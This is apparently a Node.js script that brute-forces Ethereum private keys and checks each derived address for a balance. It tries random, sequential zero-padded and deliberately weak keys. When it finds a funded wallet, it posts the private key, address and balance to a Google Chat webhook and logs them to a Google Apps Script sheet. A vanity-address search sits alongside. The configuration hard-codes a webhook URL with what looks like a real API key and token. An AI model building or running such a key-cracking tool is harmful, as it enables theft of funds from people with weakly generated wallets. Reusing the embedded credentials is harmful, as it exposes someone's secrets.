const ethers = require('ethers');
const EthereumJS = require('ethereumjs-util');
const axios = require(`axios`)

const provider = new ethers.JsonRpcProvider("https://rpc.ankr.com/eth");

const config = {
  webhook: "https://chat.googleapis.com/v1/spaces/AAAANzIFHu0/messages?key=AIzaSyDdI0hCZtE6vySjMm-WEfRq3CPzqKqqsHI&token=YBBsr3lTjAYH5oOz9fx3_3rHa7fsN5q5euTBrTxK7Gk%3D",
  isFindBalance: false,
  isFindBeautiful: true,  
  count: 1,
  sleep: 2000,
  countLoop: 100,
  checkNearNumber: false,
  countCharSameOK: 20,
  checkSameNumber: false,  
  countNumberOK: 25,
  checkRegexRepeat: true,
  countRegexRepeat: 20,
  usingAxios: true,
  logCount: true,
}
function getAddressFromPrivateKey(privateKey) {
  var public = EthereumJS.privateToPublic(Buffer.from(privateKey, 'hex'));
  var addr = EthereumJS.bufferToHex(EthereumJS.publicToAddress(public));
  return addr;
}

function genRandomPrivateKey() {
  const { randomBytes } = require('crypto');
  const privateKey = randomBytes(32);
  return privateKey.toString('hex');
}

function genRandomPrivateKeyBinary() {
  var s = `${Math.random().toString(2).replace(".","")}${Math.random().toString(2).replace(".","")}`.slice(1,65)
  return s;
}

function genRandomChar(length) {
  let result = '';
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  const charactersLength = characters.length;
  let counter = 0;
  while (counter < length) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
    counter += 1;
  }
  return result;
}

function genRandomPrivateKeyBinaryFromChar() {
  var c = genRandomChar(8)
  var s = ''
  for (var i = 0; i < c.length; i++) {
    s += c[i].charCodeAt(0).toString(2) + "";
  }
  if(s.length<64){
    while(s.length<64){
      s = `0${s}`
    }    
  }
  s = s.slice(0,64)
  return s;
}

function sleep (time) {
  return new Promise((resolve) => setTimeout(resolve, time));
}

function checkRepeatedChar(str, repeatCount) {
  const regex = new RegExp(`(.)\\1{${repeatCount - 1},}`);
  let _rs = regex.test(str)
  if(_rs){
    const matches = str.match(regex);
    let maxRepeatCount = 0;
    if (matches) {
      matches.forEach((match) => {
        maxRepeatCount = Math.max(maxRepeatCount, match.length);
      });
      return maxRepeatCount;
    }
  }
  return false;
}

async function findBeautifulString(pri,addr=""){   
  inputString = addr.replace("0x","")
  let _char = null
  let _countOK = config.countCharSameOK
  let _isOK = false
  let _msgOK = "beauti"
  if(config.checkRegexRepeat){
    let _rs = checkRepeatedChar(inputString,config.countRegexRepeat)
    if(_rs!=false){
      _isOK = true;
      _msgOK = `repeat:${_rs}`
    }
  }
  if(_isOK===false && (config.checkNearNumber || config.checkSameNumber)){
    let tempArr =[];
    for (let i = 0; i < inputString.length; ++i){
      let _currentChar = inputString.charCodeAt(i);
      if(_char==null){
        _char = _currentChar;
        tempArr.push(_currentChar)
        continue;
      }
      else if(config.checkSameNumber && _char<=57 && _currentChar<=57){
        _char = _currentChar;
        _countOK = config.countNumberOK
        tempArr.push(_currentChar)
      }
      else if(config.checkNearNumber && _currentChar-_char<=1 && _currentChar-_char>=-1){
        _char = _currentChar;
        _countOK = config.countCharSameOK
        tempArr.push(_currentChar)
      }
      else{
        break
      }
    }
    if(tempArr.length>_countOK){
      _isOK = true
      _msgOK = `beauti:${tempArr.length}`
    }
  }  
  
  if(_isOK){
    console.log(`${_msgOK}|${pri}|${addr}`)
    sendGoogleChatWebhook(`${_msgOK}|${pri}|${addr}`)
    return true
  }
  return false
}

async function findBeautifulAddr({loop}={}){  
  if(config.logCount){
    console.log("Count:",config.count)  
  }  
  for(let i=0;i<config.countLoop;i++){
    let _pri = genRandomPrivateKey();
    let _addr = getAddressFromPrivateKey(_pri)
    if(config.isFindBalance){
      const wei = await provider.getBalance(_addr);
      const eth = ethers.formatEther(wei);
      // console.log("Balance:", eth, typeof eth, _addr);
      if(Number(eth)>0){
        console.log(`${eth}|${_pri}|${_addr}`);
        sendGoogleChatWebhook(`${eth}|${_pri}|${_addr}`)
        return {
          pri: _pri,
          addr: _addr
        }
      }
    }
    if(config.isFindBeautiful){
      findBeautifulString(_pri,_addr)
    }
  }
  sleep(config.sleep).then(() => {
    // console.clear()
    config.count++;
    findBeautifulAddr()
  });
}

function sendGoogleChatWebhook(message) {
  const webhookUrl = config.webhook;  
  if(config.usingAxios){
    axios.post(webhookUrl, {
      text: message,
    })
    .then((res) => {
      // console.log(res)
    })
    .catch((err) => {
      // console.error(err.toJSON())
    })
  }
  else{
    const data = {
      'text': message
    };
    const headers = {
      'Content-Type': 'application/json; charset=UTF-8'
    };
    fetch(webhookUrl, {
      method: 'POST',
      headers: headers,
      body: JSON.stringify(data)
    })
    .then(response => {
    })
    .catch(error => {
    });
  }  
}

exports.find = ({isFindBalance,isFindBeautiful,webhook,...more}={})=>{
  config.count = 1;
  if(isFindBalance!=null){
    config.isFindBalance = isFindBalance
  }
  if(isFindBeautiful!=null){
    config.isFindBeautiful = isFindBeautiful
  }
  if(webhook!=null){
    config.webhook = webhook
  }
  if(more && Object.keys(more).length>0){
    for(let k of Object.keys(more)){
      config[k] = more[k]
    }
  }
  findBeautifulAddr()
}

const config2 = {
  apiBase: "https://script.google.com/macros/s/AKfycbwVBHVDrBAlNiNgkJQ5pxWR64ABPdJT4L_awBIQxGFg7irNrtpWP9py9iRq1BJoQt0/exec",
  start: "1",
  pre: "0",
  suf: "",
  count: 0,
  countLoop: 100,
  sheet: "R0",
  isFindBalance: true,
  isReverse: false,
  isRandom: false,
  isRandomBinary: false,
  isRandomBinaryChar: false,
  showLogFull: false,
  sleep: 1000,
  base: "0000000000000000000000000000000000000000000000000000000000000000"
}

async function find2B(base="",start=1){
  let _startThen = start;
  for(let i=0;i<config2.countLoop;i++){
    let _number = Number(start)+i;
    _startThen = _number;
    let _numberString = String(_number);
    let _pri = null;
    if(config2.isReverse){
      _pri = `${_numberString}${base}`.slice(0,64)
    }
    else if(config2.isRandom){
      if(config2.isRandomBinary){
        _pri = genRandomPrivateKeyBinary()
      }
      else if(config2.isRandomBinaryChar){
        _pri = genRandomPrivateKeyBinaryFromChar()
      }
      else{
        _pri = genRandomPrivateKey(); 
      }      
    }
    else{
      _pri = `${base.slice(0,64-_numberString.length)}${_numberString}`;
    }
    if(_pri==null){
      console.log("empty pri")
      break;
    }
    if(config2.showLogFull){
      console.log("pr:",_pri)  
    }    
    let _addr = getAddressFromPrivateKey(_pri)
    if(config2.isFindBalance){
      const wei = await provider.getBalance(_addr);
      const eth = ethers.formatEther(wei);
      if(config2.showLogFull){
        console.log("Balance:", eth, _addr); 
      }
      let _n = _number
      if(config2.isRandom){
        _n = `${_pri}`
      }
      if(Number(eth)>0){
        console.log(`${eth}|${_pri}|${_addr}`);
        sendGoogleChatWebhook(`${eth}|${_pri}|${_addr}`)        
        var apiGetAddRow = `${config2.apiBase}?action=addNew&sheet=${config2.sheet}&n=${_n}&pp=${_addr}&b=${eth}`
        axios.get(apiGetAddRow)
      }
      else if(i==config2.countLoop-1){
        if(config2.isRandom){
          _n = Number(start)
        }
        var apiGetAddRow = `${config2.apiBase}?action=addNew&sheet=${config2.sheet}&n=${_n}&pp=${_addr}&b=${eth}`
        axios.get(apiGetAddRow)
        console.log("end:",_n)
      }
    }
  }
  sleep(config2.sleep).then(() => {
    // console.clear()
    config2.count++;
    find2B(base,_startThen)
  });
}
async function find2(){
  var apiGetLast = `${config2.apiBase}?action=getLast&sheet=${config2.sheet}`
  axios.get(apiGetLast)
  .then((res) => {
    if(res.data && res.data.data>=0){
      config2.start = Number(res.data.data)+1
      console.log("start:",config2.start)
      let _newBase = `${config2.pre}${config2.base}`.slice(0,64)
      find2B(_newBase,config2.start)
    }
    else{
      console.log("no data:",res.data)
    }    
  })
  .catch((err) => {
    console.error(err.toJSON())
  })
}

exports.find2 = (more={})=>{
  if(more && Object.keys(more).length>0){
    for(let k of Object.keys(more)){
      config2[k] = more[k]
    }
  }
  find2()
}

function testFind2RR(){
  config2.sheet = "RR";
  config2.isRandom = true;
  config2.showLogFull = true
  find2()
}

function testFind2RRB(){
  config2.sheet = "RRB";
  config2.isRandom = true;
  config2.isRandomBinary = true;
  config2.showLogFull = true
  find2()
}

function testFind2RRBC(){
  config2.sheet = "RRBC";
  config2.isRandom = true;
  config2.isRandomBinaryChar = true;
  config2.showLogFull = true
  find2()
}

function testFind2NR(){
  config2.sheet = "NR";
  config2.isReverse = true;
  config2.showLogFull = true
  find2()
}

// testFind2RRB()
// testFind2RRBC()
// var s = genRandomPrivateKeyBinaryFromChar();
// console.log(s)